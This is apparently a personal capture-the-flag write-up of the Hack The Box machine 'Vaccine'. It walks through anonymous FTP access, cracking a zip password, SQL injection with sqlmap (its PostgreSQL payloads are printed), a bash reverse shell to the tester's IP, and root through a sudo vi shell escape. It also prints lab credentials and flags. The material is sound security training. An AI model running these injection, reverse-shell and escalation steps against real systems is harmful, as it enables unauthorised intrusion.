---

---
---
# Vaccine
---
## Getting Started
---
Use command to set Target IP
```bash
IP='10.129.239.5' ; echo $IP
```

Use command to set Target IP
```bash
HIP="$(ifconfig tun0  | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')" ; echo $HIP

```
---
## Enumeration
---
#### NMAP
---
Nmap Command Ran
```bash
nmap -sC -sV $IP
```

Results
>Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-27 17:13 EDT
Nmap scan report for 10.129.239.5
Host is up (0.027s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.102
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MegaCorp Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
>
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.34 seconds

***Finding***

tp-anon: Anonymous FTP login allowed (FTP code 230)
This means you could log in using Anonymous with no password

**FTP MAN**
![[Pasted image 20220927171602.png]]

Command
```bash
ftp $IP
```

Result

```
Connected to 10.129.239.5.
220 (vsFTPd 3.0.3)
Name (10.129.239.5:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

---
#### FTP Enumeration
---
Command
```bash
ls
```

Result
```
229 Entering Extended Passive Mode (|||10447|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip

```

Identified a backup.zip and tried to retrieve it.

Command
```bash
get backup.zip
```

Result
```
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10633|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |******************************************************************************************************|  2533       36.05 MiB/s    00:00 ETA
226 Transfer complete.
2533 bytes received in 00:00 (90.72 KiB/s)

```

Unzip the file
requires password

Result
```
Archive:  backup.zip
[backup.zip] index.php password:     
```

***Finding***

Zip is password protected.

Follow [johntheriper zip walkthrough](obsidian://open?vault=OSCP&file=TOOLS%2Fjohntheripper%2FZIP%20HOW%20TO)

Password = 741852963

Unzip file with password.

Result
```
Archive:  backup.zip
[backup.zip] index.php password: 
  inflating: index.php               
  inflating: style.css                 
```

In index.php found this line

Command
```php
<?php

session_start();

if(isset($_POST['username']) && isset($_POST['password'])) {

if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {

$_SESSION['login'] = "true";

header("Location: dashboard.php");

}

}

?>
```

Identified username 'admin' and password as an md5 hash
```
2cb42f8734ea607eefed3b70af13bbd3
```

reversed the MD5 hash online could have used hashcat  and returned querty789

**USERNAME : admin
PASSWORD : querty789**

---
#### WEBSITE Enumeration
---
Use credentials to access website

![[Pasted image 20220927180813.png]]

Seems to be a table of some sort. You can arrange by the top column and search

Passed a single ' in the search and returned this

![[Pasted image 20220927181014.png]]
```
ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%'%' ^
```

---
## Foothold
---
Identified  that the website is using SQL. 

Used [SQLMAP](obsidian://open?vault=OSCP&file=TOOLS%2Fsqlmap%2FHOW%20TO)

Command
```bash
sqlmap -u 'http://10.129.239.5/dashboard.php?search=any+query' --cookie="PHPSESSID=1a5mp168lht1niqkdrjh277q48"
```

Result
```
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.7#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:30:38 /2022-09-27/

[18:30:38] [INFO] testing connection to the target URL
[18:30:38] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:30:38] [INFO] testing if the target URL content is stable
[18:30:38] [INFO] target URL content is stable
[18:30:38] [INFO] testing if GET parameter 'search' is dynamic
[18:30:38] [WARNING] GET parameter 'search' does not appear to be dynamic
[18:30:39] [INFO] heuristic (basic) test shows that GET parameter 'search' might be injectable (possible DBMS: 'PostgreSQL')
[18:30:39] [INFO] testing for SQL injection on GET parameter 'search'
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] 
[18:30:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:31:00] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:31:00] [INFO] testing 'Generic inline queries'
[18:31:00] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[18:31:00] [INFO] GET parameter 'search' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable 
[18:31:00] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:31:00] [INFO] GET parameter 'search' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable 
[18:31:00] [INFO] testing 'PostgreSQL inline queries'
[18:31:00] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:31:00] [WARNING] time-based comparison requires larger statistical model, please wait..... (done)
[18:31:11] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
[18:31:11] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[18:31:21] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable 
[18:31:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: search=any query' AND (SELECT (CASE WHEN (8985=8985) THEN NULL ELSE CAST((CHR(111)||CHR(73)||CHR(100)||CHR(98)) AS NUMERIC) END)) IS NULL-- HRtV

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: search=any query' AND 5276=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (5276=5276) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(112)||CHR(112)||CHR(113)) AS NUMERIC)-- LMgD

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=any query';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: search=any query' AND 4021=(SELECT 4021 FROM PG_SLEEP(5))-- akZU
---
[18:31:44] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[18:31:44] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.129.239.5'

[*] ending @ 18:31:44 /2022-09-27/
```


Tool confirmed that is is vulnerable to SQL injection

Attempt to get a shell with ```--os-shell``` flag.

Command
```bash
sqlmap -u 'http://10.129.239.5/dashboard.php?search=any+query' --cookie="PHPSESSID=1a5mp168lht1niqkdrjh277q48" -os-shell
```

Result
```
        ___
       __H__                                                                                                                                       
 ___ ___["]_____ ___ ___  {1.6.7#stable}                                                                                                           
|_ -| . ["]     | .'| . |                                                                                                                          
|___|_  [.]_|_|_|__,|  _|                                                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:37:25 /2022-09-27/

[18:37:25] [INFO] resuming back-end DBMS 'postgresql' 
[18:37:25] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: search=any query' AND (SELECT (CASE WHEN (8985=8985) THEN NULL ELSE CAST((CHR(111)||CHR(73)||CHR(100)||CHR(98)) AS NUMERIC) END)) IS NULL-- HRtV

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: search=any query' AND 5276=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (5276=5276) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(112)||CHR(112)||CHR(113)) AS NUMERIC)-- LMgD

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=any query';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: search=any query' AND 4021=(SELECT 4021 FROM PG_SLEEP(5))-- akZU
---
[18:37:26] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[18:37:26] [INFO] fingerprinting the back-end DBMS operating system
[18:37:27] [INFO] the back-end DBMS operating system is Linux
[18:37:27] [INFO] testing if current user is DBA
[18:37:28] [INFO] retrieved: '1'
[18:37:28] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[18:37:28] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> 

```

Obtained unstable shell

Turn on netcat listener.

Command
```bash
sudo nc -lvnp 443
```

Command
```bash
bash -c "bash -i >& /dev/tcp/10.10.15.102/443 0>&1"
```

Result
```
connect to [10.10.15.102] from (UNKNOWN) [10.129.239.5] 49296
bash: cannot set terminal process group (3820): Inappropriate ioctl for device
bash: no job control in this shell
postgres@vaccine:/var/lib/postgresql/11/main$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

CTRL+Z 'get out of netcat'

```BASH
stty raw - echp
postgres@vaccine:/var/lib/postgresql/11/main$ cd ..
cd ..
postgres@vaccine:/var/lib/postgresql/11$ cd ..
cd ..
postgres@vaccine:/var/lib/postgresql$ ls
ls
11  user.txt
postgres@vaccine:/var/lib/postgresql$ cat user.txt
cat user.txt
ec9b13ca4d6229cd5cc1e09980965bf7
postgres@vaccine:/var/lib/postgresql$ 
```

---
## Privilege Escalation
---
Try to find the password in the /var/www/html folder, since the machine uses both PHP & SQL, meaning that there should be credentials in clear text.

Command
```bash
ls -la  
```

Results
```
total 392  
drwxr-xr-x 2 root root 4096 Jul 23 14:00 .  
drwxr-xr-x 3 root root 4096 Jul 23 14:00 ..  
-rw-rw-r-- 1 root root 362847 Feb 3 2020 bg.png  
-rw-r--r-- 1 root root 4723 Feb 3 2020 dashboard.css  
-rw-r--r-- 1 root root 50 Jan 30 2020 dashboard.js  
-rw-r--r-- 1 root root 2313 Feb 4 2020 dashboard.php  
-rw-r--r-- 1 root root 2594 Feb 3 2020 index.php  
-rw-r--r-- 1 root root 1100 Jan 30 2020 license.txt  
-rw-r--r-- 1 root root 3274 Feb 3 2020 style.css
```
 
Search for Passwords in the files. 

Command
```bash
cat dashboard.php
```

Result
```
session_start();  
if($_SESSION['login'] !== "true") {  
header("Location: index.php");  
die();  
}  
try {  
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres  
password=P@s5w0rd!");  
}
```

 ***Finding***
 $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");

SSH username and password

Log in with SSH and check sudo privileges

Command
```bash
sudo -l
```

Result
```
Matching Defaults entries for postgres on vaccine:  
env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR  
XFILESEARCHPATH XUSERFILESEARCHPATH",  
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,  
mail_badpass  
User postgres may run the following commands on vaccine:  
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

User has the ablility to vi as root in /etc/postgresql/11/main/pg_hba.conf

Command
```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Result
>![[Pasted image 20220928072902.png]]

Use `:` to enter command

Command
```bash
:set shell=/bin/sh
```
```
:set shell
```

Result
```
# whoami  
root  
# id  
uid=0(root) gid=0(root) groups=0(root)  
#
```

Get get to bash
```
# cd /root  
# bash  
root@vaccine:~# ls  
root.txt  
root@vaccine:~#cat root.txt
```

---
## Flags
---
user.text
```bash
ec9b13ca4d6229cd5cc1e09980965bf7
```

root.txt
```
dd6e058e814260bc70e9bbdef2715849

```

---
## Tags
---
#ftp #sql #suid #johntheripper #zip2john #zip #sqlmap

